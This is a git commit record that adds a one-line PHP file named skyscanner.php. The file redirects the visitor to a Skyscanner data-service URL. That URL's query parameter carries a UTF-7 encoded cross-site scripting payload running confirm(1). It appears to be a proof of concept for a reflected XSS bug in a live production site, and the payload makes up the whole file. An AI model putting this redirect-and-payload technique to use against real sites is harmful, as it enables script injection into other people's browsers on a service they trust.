e1bfc8fc12b58ad71e585d24371cce3c6520f943
missoum1307 <missoum1307@users.noreply.github.com>
2018-08-02 16:21:27 +0100

    Create skyscanner.php

---
+++ skyscanner.php
@@ -0,0 +1,1 @@
+<?php header('location: http://www.skyscanner.net/dataservices/browse/v3/mapweb/UK/GBP/en-GB/destinations/CFKA/everywhere/2018-03/2018-03?mustIncludeCountries=%2B/v8-%2BADw-script%2BAD4-confirm(1)%2BADw-/script%2BAD4-')?>
